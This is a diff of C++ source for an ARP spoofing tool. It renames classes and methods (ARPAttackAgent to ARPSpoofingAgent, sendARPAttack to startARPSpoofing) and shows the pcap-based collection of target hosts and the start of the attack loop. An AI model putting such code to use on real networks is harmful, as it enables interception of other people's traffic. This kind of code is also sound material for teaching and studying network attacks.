@@ -2,15 +2,15 @@
 #include <netinet/in.h>
 #include <iostream>
 #include <pcap.h>
-#include "arp/SendARPManager.cpp"
+#include "arp/ARPSessionManager.cpp"
 
-class ARPAttackAgent {
+class ARPSpoofingAgent {
 private:
     char* netInterface;
     std::pair<uint8_t*, uint8_t*>* sessionList;
 
     bool isBroadcast = false;
-    SendARPManager* sendArpManager;
+    ARPSessionManager* sendArpManager;
 
     std::optional<ARPHeader*> processARPPacket(const uint8_t *packet) {
         auto *etherHeader = (EtherHeader *) packet;
@@ -24,17 +24,14 @@ private:
 public:
     const static int UNLIMITED = 0;
 
-    ARPAttackAgent(char* netInterface, std::pair<uint8_t*, uint8_t*>* sessionList):
+    ARPSpoofingAgent(char* netInterface, std::optional<std::pair<uint8_t*, uint8_t*>*> sessionList):
     netInterface(netInterface) {
-        if (sessionList) this->sessionList = sessionList;
-        else {
-            this->sessionList = nullptr;
-            this->isBroadcast = true;
-        }
-        this->sendArpManager = new SendARPManager(netInterface);
+        if (sessionList) this->sessionList = sessionList.value();
+        else this->isBroadcast = true;
+        this->sendArpManager = new ARPSessionManager(netInterface);
     }
 
-    void scanClients() {
+    void buildSessions() {
         std::cout << "INFO: Start scanning sender clients..." << std::endl;
 
         char errBuf[PCAP_ERRBUF_SIZE];
@@ -48,7 +45,7 @@ public:
             auto arpHeader = this->processARPPacket(packet);
 
             if (arpHeader) {
-                if (this->sendArpManager->addARPTarget(arpHeader.value())) {
+                if (this->sendArpManager->addSession(*arpHeader.value())) {
                     std::cout << "INFO: Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
                     go = false;
                 }
@@ -58,7 +55,7 @@ public:
         std::cout << "INFO: Success scanning sender clients" << std::endl;
     }
 
-    void sendARPAttack(uint maxAttack, uint delay=1) {
+    void startARPSpoofing(uint maxAttack, uint delay= 1) {
         std::cout << "INFO: Start ARP spoofing attack...." << std::endl;
 
         bool go = true;
